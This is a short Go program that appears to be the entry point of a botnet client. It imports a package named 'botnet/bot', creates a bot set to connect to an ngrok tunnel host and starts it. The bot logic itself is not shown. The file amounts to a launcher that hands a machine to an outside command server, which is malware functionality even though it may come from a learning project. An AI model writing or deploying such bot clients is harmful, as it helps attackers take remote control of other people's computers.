package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("2efa75f0.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Start()
}
